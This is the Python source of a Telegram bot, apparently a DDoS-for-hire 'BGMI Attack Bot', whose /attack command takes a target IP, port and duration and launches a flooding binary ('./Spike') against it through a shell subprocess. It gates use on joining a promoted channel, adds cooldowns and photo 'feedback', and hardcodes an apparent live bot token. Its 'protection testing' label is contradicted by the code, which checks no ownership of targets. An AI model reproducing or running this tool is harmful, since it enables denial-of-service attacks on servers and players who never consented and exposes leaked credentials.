import os
import re
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging
import threading
import asyncio
from datetime import datetime, timedelta, timezone
from PIL import Image
import imagehash
import time
import requests
from telebot import TeleBot, types
from requests.exceptions import ReadTimeout

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Telegram bot token and channel IDs
TOKEN = '7788865701:AAEW3E0_GZWjcwc4oyLKgFSuiV0d849mvXM'  # Replace with your actual bot token
CHANNEL_ID = '-1002629547525'  # Replace with your specific channel or group ID for attacks
FEEDBACK_CHANNEL_ID = '-1002688374033'  # Replace with your specific channel ID for feedback
message_queue = []


# Official channel details
OFFICIAL_CHANNEL = "@titanddos24opop"  # Replace with your channel username or ID
CHANNEL_LINK = "https://t.me/titanddos24opop"  # Replace with your channel link

# Initialize the bot
bot = telebot.TeleBot(TOKEN)
# Configure requests session with timeout
session = requests.Session()
session.timeout = 60  # 60 seconds timeout for all requests
# Apply custom session to the bot
bot.session = session


# Global control variables
attack_in_progress = False
image_hashes = {}  # Stores hashes of all received feedback images
user_attacks = {}
user_cooldowns = {}
user_photos = {}  
user_bans = {}  
pending_feedback = set()
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)

# Configuration
COOLDOWN_DURATION = 600  # 1 minute cooldown
BAN_DURATION = timedelta(hours=1)  # 1 hour ban for invalid feedback
DAILY_ATTACK_LIMIT = 500000
EXEMPTED_USERS = [7163028849, 7184121244, 6501891681]
# Configuration
MAX_ATTACK_DURATION = 120  # Maximum attack duration in seconds (e.g., 300 seconds = 5 minutes)

def is_member(user_id):
    """Check if the user is a member of the official channel."""
    try:
        chat_member = bot.get_chat_member(OFFICIAL_CHANNEL, user_id)
        return chat_member.status in ["member", "administrator", "creator"]
    except Exception as e:
        logging.error(f"Failed to check membership: {e}")
        return False


def sanitize_filename(filename):
    """Sanitize filenames to prevent path traversal."""
    return re.sub(r'[^\w_.-]', '_', filename)

def get_image_hash(image_path):
    """Generate perceptual hash for image."""
    with Image.open(image_path) as img:
        return str(imagehash.average_hash(img))

def safe_reply_to(message, text, retries=3):
    for _ in range(retries):
        try:
            return bot.reply_to(message, text)
        except ReadTimeout:
            logging.warning("Timeout occurred, retrying...")
            continue
    logging.error("Failed to send message after multiple retries")

def reset_daily_counts():
    """Reset daily counters at midnight IST."""
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=30)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        pending_feedback.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)



# Photo handler with hash verification and feedback forwarding
# Photo handler with enhanced feedback tracking
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    try:
        user_id = message.from_user.id
        
        # Ignore photos from users without pending feedback
        if user_id not in pending_feedback:
            return

        # Get highest resolution photo
        file_id = message.photo[-1].file_id  
        file_info = bot.get_file(file_id)
        
        # Secure download process
        safe_filename = sanitize_filename(os.path.basename(file_info.file_path))
        image_path = f"/tmp/{safe_filename}"
        
        # Download and hash
        downloaded_file = bot.download_file(file_info.file_path)
        with open(image_path, 'wb') as f:
            f.write(downloaded_file)
        
        image_hash = get_image_hash(image_path)

        # Duplicate check
        if image_hash in image_hashes:
            bot.reply_to(message, "⚠️ Duplicate feedback detected! 1-hour ban applied.")
            user_bans[user_id] = datetime.now() + BAN_DURATION
            os.remove(image_path)
            return

        # Store hash and update user status
        image_hashes[image_hash] = user_id
        
        # Remove from pending feedback and unban if needed
        pending_feedback.discard(user_id)
        if user_id in user_bans:
            del user_bans[user_id]  # Unban the user immediately
        
        # Forward to feedback channel
        with open(image_path, 'rb') as f:
            # Get user's username or full name
            user = message.from_user
            username = f"@{user.username}" if user.username else user.full_name
            caption = f"Feedback from {username}"
            bot.send_photo(FEEDBACK_CHANNEL_ID, f, caption=caption)
        
        # Confirm to user
        bot.reply_to(message, "✅ Feedback accepted! You may now attack again.")

    except Exception as e:
        logging.error(f"Photo error: {e}")
        bot.reply_to(message, "❌ Error processing feedback")
    finally:
        if 'image_path' in locals() and os.path.exists(image_path):
            os.remove(image_path)


@bot.message_handler(commands=['attack'])
def bgmi_command(message):
    global attack_in_progress
    reset_daily_counts()
    user_id = message.from_user.id

    # Check if user has joined the official channel
    if not is_member(user_id):
        # Create a "Join Channel" button
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🌟 Join Official Channel 🌟", url=CHANNEL_LINK))
        markup.add(InlineKeyboardButton("✅ I've Joined", callback_data="check_membership"))

        bot.reply_to(
            message,
            "🚨 *Access Denied* 🚨\n\n"
            "To use this bot, you must join our official channel.\n"
            "Click the button below to join and then press *'I've Joined'* to verify.",
            reply_markup=markup,
            parse_mode="Markdown"
        )
        return

    # Channel restriction check
    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(message.chat.id, "⚠️ Unauthorized usage detected!")
        return

    # Ban check
    if user_id in user_bans:
        if datetime.now() < user_bans[user_id]:
            remaining = user_bans[user_id] - datetime.now()
            safe_reply_to(message, f"🚫 Banned for {remaining.seconds//3600}hr {(remaining.seconds//60)%60}min")
            return
        del user_bans[user_id]

    # Attack concurrency control
    if attack_in_progress:
        bot.reply_to(message, "⚡ Another attack is running. Wait your turn.")
        return

    # Non-exempt user checks
    if user_id not in EXEMPTED_USERS:
        # Check for pending feedback
        if user_id in pending_feedback:
            user_bans[user_id] = datetime.now() + BAN_DURATION
            bot.reply_to(message, "🚫 Missing feedback from last attack! 1-hour ban.")
            return
            
        if user_cooldowns.get(user_id, datetime.min) > datetime.now():
            cooldown = user_cooldowns[user_id] - datetime.now()
            bot.reply_to(message, f"⏳ Cooldown: {cooldown.seconds}s remaining")
            return
            
        if user_attacks.get(user_id, 0) >= DAILY_ATTACK_LIMIT:
            bot.reply_to(message, "❌ Daily attack limit reached!")
            return

    # Process attackf
    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            raise ValueError("Usage: /attack <IP> <PORT> <DURATION>")

        ip, port, duration = args
        if not (ip.count('.') == 3 and all(0<=int(p)<=255 for p in ip.split('.'))):
            raise ValueError("Invalid IP address")
        if not port.isdigit() or not 0<=int(port)<=65535:
            raise ValueError("Invalid port")
        if not duration.isdigit():
            raise ValueError("Invalid duration")

        duration = int(duration)
        if duration > MAX_ATTACK_DURATION:
            raise ValueError(f"⚠️ Maximum attack duration is {MAX_ATTACK_DURATION} seconds.")

        # Update attack status
        attack_in_progress = True
        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
            pending_feedback.add(user_id)  # Add to pending feedback

        # Get attacker's username or full name
        user = message.from_user
        attacker_name = f"@{user.username}" if user.username else user.full_name

        # Create a "Support" button
        support_button = InlineKeyboardMarkup()
        support_button.add(InlineKeyboardButton("🙏 Support 🙏", url="https://t.me/titanfreeop"))

        # Send attack confirmation with attacker's name and support button
        bot.reply_to(
            message,
            f"🚀 Attack Sent Successfully! 🚀\n"
            f"🎯 Target:- {ip}:{port}\n"
            f"⏳ Time:- {duration}s\n"
            f"👤 Attacker:- {attacker_name}",
            reply_markup=support_button
        )

        # Execute the attack
        asyncio.run(execute_attack(ip, port, duration, message.from_user.first_name))

    except Exception as e:
        bot.reply_to(message, f"⚠️ Note: {str(e)}")
        logging.error(f"Attack error: {str(e)}")
    finally:
        attack_in_progress = False

@bot.callback_query_handler(func=lambda call: call.data == "check_membership")
def check_membership(call):
    """Handle the 'I've Joined' button click."""
    user_id = call.from_user.id
    if is_member(user_id):
        bot.answer_callback_query(call.id, "✅ Thank you for joining! You can now use /attack.")
    else:
        bot.answer_callback_query(call.id, "❌ You haven't joined the channel yet. Please join and try again.")

async def execute_attack(ip, port, duration, username):
    """Run attack command asynchronously with predefined packet size and thread count."""
    try:
        # Start the attack process with predefined values
        proc = await asyncio.create_subprocess_shell(
            f"./Spike {ip} {port} {duration} 12 750",
            stderr=asyncio.subprocess.PIPE
        )

        # Wait for the attack duration to complete
        await asyncio.sleep(duration)

        # Send attack completion message
        bot.send_message(
            CHANNEL_ID,
            f"✅ Attack on {ip}:{port} completed! "
            f"Duration: {duration}s"
        )
    except Exception as e:
        # Send error message if something goes wrong
        bot.send_message(
            CHANNEL_ID,
            f"❌ Attack on {ip}:{port} failed: {str(e)}"
        )
    finally:
        # Ensure the process is terminated
        if proc and proc.returncode is None:
            proc.terminate()
            await proc.wait()

@bot.callback_query_handler(func=lambda call: call.data == "start_bgmi")
def callback_query(call):
    bot.answer_callback_query(call.id)  # Acknowledge the callback
    bot.send_message(call.message.chat.id, "Please type /attack in the chat to continue.")



@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = """
    🚀 *Welcome to BGMI Attack Bot* 🛡️
    
    *_A Powerful DDoS Protection Testing Tool_*
    
    📌 *Quick Start Guide*
    1️⃣ Use /attack command to start attack
    2️⃣ Follow format: /attack IP PORT TIME
    3️⃣ Provide feedback after each attack
    
    ⚠️ *Rules*
    - Max attack time: 1 minutes ⏳
    - Daily limit: 15 attacks 📊
    - Banned for fake feedback 🚫
    
    🔗 Support: @titanfreeop
    🔰 Owner : @Titanop24
    """
    
    # Add quick action buttons
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(
        telebot.types.InlineKeyboardButton("⚡ Start Attack", callback_data='start_bgmi'),
        telebot.types.InlineKeyboardButton("📚 Tutorial", url='https://t.me/titanfreeop')
    )
    
    bot.send_message(
        message.chat.id,
        welcome_text,
        parse_mode='Markdown',
        reply_markup=markup
    )

@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = """
    🔧 *BGMI Bot Help Center* 🛠️
    
    📝 *Available Commands*
    /start - Show welcome message 🌟
    /attack - Start attack 🚀
    /help - Show this help message ❓
    
    🎯 *Attack Format*
    `/attack 1.1.1.1 80 60`
    - IP: Target IP address 🌐
    - Port: Target port 🔌
    - Time: Attack duration in seconds ⏱️
    
    🛡️ *Safety Features*
    - Auto-cooldown: 1 minute between attacks ⏳
    - Feedback system: Photo verification required 📸
    - Attack limits: Prevents abuse 🛑
    
    📌 *Need Help?*
    Contact support: @titanfreeop
    Report issues: @Titanop24
    """
    
    # Add support buttons
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(
        telebot.types.InlineKeyboardButton("🆘 Immediate Support", url='t.me/Titanop24'),
        telebot.types.InlineKeyboardButton("📘 Documentation", url='https://t.me/titanfreeop')
    )
    
    bot.send_message(
        message.chat.id,
        help_text,
        parse_mode='Markdown',
        reply_markup=markup
    )

# Modified message sending with retry logic
def send_message_with_retry(chat_id, text, retries=3):
    for attempt in range(retries):
        try:
            bot.send_message(chat_id, text, timeout=10)  # Per-message timeout
            return True
        except ReadTimeout:
            if attempt == retries - 1:
                logging.error(f"Failed to send message after {retries} attempts")
                return False
            logging.warning(f"Retrying message send ({attempt+1}/{retries})")
            continue

def message_worker():
    while True:
        if message_queue:
            msg = message_queue.pop(0)
            try:
                bot.send_message(msg['chat_id'], msg['text'])
            except ReadTimeout:
                logging.error("Async message failed after timeout")
        time.sleep(1)

# Start worker thread
threading.Thread(target=message_worker, daemon=True).start()


if __name__ == "__main__":
    logging.info("Bot started")
    bot.polling(none_stop=True)
